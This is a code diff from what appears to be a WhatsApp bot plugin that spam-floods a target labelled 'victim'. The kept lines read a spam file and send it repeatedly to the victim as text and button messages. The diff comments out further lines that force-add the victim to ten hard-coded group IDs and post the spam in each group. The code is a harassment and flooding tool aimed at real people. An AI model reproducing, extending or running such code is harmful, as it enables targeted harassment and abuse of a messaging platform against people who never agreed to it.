@@ -64,7 +64,7 @@ let i2 = 0;
 // await conn.groupParticipantsUpdate (`120363042414339652@g.us` , [victim], 'add')
 
 // let groupsx = [`120363042283397418@g.us`,`120363041793802829@g.us`]
-let group1 = `120363042283397418@g.us`
+/*let group1 = `120363042283397418@g.us`
 let group2 = `120363041793802829@g.us`
 let group3 = `120363040842107188@g.us`
 let group4 = `120363026344956097@g.us`
@@ -73,7 +73,7 @@ let group6 = `120363024472896585@g.us`
 let group7 = `120363041662300064@g.us`
 let group8 = `120363043549441142@g.us`
 let group9 = `120363042664740502@g.us`
-let group10 = `120363024853238048@g.us`
+let group10 = `120363024853238048@g.us`*/
 
  await conn.sendMessage(m.chat, { text : `ᴀᴅᴅɪɴɢ **10 ɢʀᴏᴜᴘꜱ && ꜱᴇɴᴅɪɴɢ **${count *2} ꜱᴘᴀᴍꜱ...` } , { quoted: m } )
 
@@ -106,7 +106,7 @@ let group10 = `120363024853238048@g.us`
 
 
     
-    await conn.groupParticipantsUpdate(group1, [victim2], 'add') 
+    /*await conn.groupParticipantsUpdate(group1, [victim2], 'add') 
     await conn.groupParticipantsUpdate(group2, [victim2], 'add')
     await conn.groupParticipantsUpdate(group3, [victim2], 'add')
     await conn.groupParticipantsUpdate(group4, [victim2], 'add')
@@ -119,7 +119,7 @@ let group10 = `120363024853238048@g.us`
 
     await conn.groupParticipantsUpdate(group8, [victim2], 'add')
     await conn.groupParticipantsUpdate(group9, [victim2], 'add')
-    await conn.groupParticipantsUpdate(group10, [victim2], 'add')
+    await conn.groupParticipantsUpdate(group10, [victim2], 'add')*/
 
 
 
@@ -140,7 +140,7 @@ let textx = fs.readFileSync(`${spam1}`)
     
    await conn.sendMessage(victim2, { text : `${textx}` })
    await conn.sendButton(victim2, `${textx}`, `${textx}`, [`${textx}`, `${textx}`], m)
-   await conn.sendMessage(group1, { text : `${textx}` })
+   /*await conn.sendMessage(group1, { text : `${textx}` })
    await conn.sendMessage(group2, { text : `${textx}` })
    await conn.sendMessage(group3, { text : `${textx}` })
    await conn.sendMessage(group4, { text : `${textx}` })
@@ -155,7 +155,7 @@ let textx = fs.readFileSync(`${spam1}`)
 
    await conn.sendMessage(group9, { text : `${textx}` })
 
-   await conn.sendMessage(group10, { text : `${textx}` })
+   await conn.sendMessage(group10, { text : `${textx}` })*/
 
 
     //await conn.sendText(group2, textx)
